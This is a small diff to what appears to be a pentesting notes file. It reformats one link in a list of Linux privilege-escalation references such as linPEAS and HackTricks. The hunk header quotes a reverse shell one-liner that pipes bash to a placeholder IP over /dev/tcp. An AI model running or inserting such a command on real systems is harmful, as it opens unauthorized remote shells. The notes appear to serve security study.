@@ -270,4 +270,4 @@ bash -i >& /dev/tcp/IP/9999 0>&1
  - http://strongcourage.github.io/2020/05/03/enum.html
  - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
  - https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist 
- - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+ - **https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ **- Basic Linux Privilege Escalation
